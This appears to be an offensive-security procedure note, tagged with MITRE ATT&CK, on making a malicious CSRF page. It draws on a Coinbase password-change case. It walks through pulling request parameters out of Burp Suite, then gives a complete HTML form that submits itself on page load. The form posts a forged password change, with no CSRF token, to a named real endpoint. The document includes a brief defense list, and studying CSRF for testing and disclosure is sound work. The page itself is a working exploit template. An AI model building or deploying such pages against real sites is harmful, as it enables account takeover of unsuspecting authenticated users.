---
id: proc-generate-csrf-form
tags:
  - csrf
  - poc
  - web
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:03.111Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Generate Malicious CSRF HTML Form

## Summary

This procedure uses intercepted request data to create a malicious HTML form that auto-submits a forged password change request, omitting CSRF tokens to exploit missing validations.

## Description

Based on captured form data from tools like Burp Suite, craft an HTML page with hidden inputs for password fields and JavaScript to submit to the target endpoint. The form targets authenticated users visiting the attacker's page, potentially changing their password without interaction. In the Coinbase case, fields included old_password, password, and password_confirmation; the POC omitted the CSRF parameter. Test in a browser to ensure submission works.

## Requirements

1. Intercepted request details (endpoint, parameters)
2. Text editor or Burp's built-in generator for HTML
3. Victim's known old password (or guess/common value)

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on all state-changing endpoints
- Validate referer/origin headers
- Educate users on phishing and external link risks

## Objectives

1. Replicate legitimate request without protections
2. Enable cross-site form submission
3. Test for CSRF vulnerability

## Instructions

### Step 1: Extract Data from Interception

**Context**: Use Burp to copy request parameters.

In Burp Repeater, right-click the request and select "Copy as curl" or manually note fields.

> Expected output: Parameters like old_password=oldpass&password=newpass&password_confirmation=newpass.

### Step 2: Craft HTML Form

**Context**: Build the POC HTML omitting CSRF token.

Create file csrf_poc.html:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrfForm" action="https://www.coinbase.com/users/59215b8f0ec7c37a4ca27b00/password_reset" method="POST">
<input type="hidden" name="old_password" value="victim_old_pass">
<input type="hidden" name="password" value="attacker_new_pass">
<input type="hidden" name="password_confirmation" value="attacker_new_pass">
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

> Auto-submits on load. Expected output: Form ready for hosting.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[csrf]]
- [[web-exploit]]
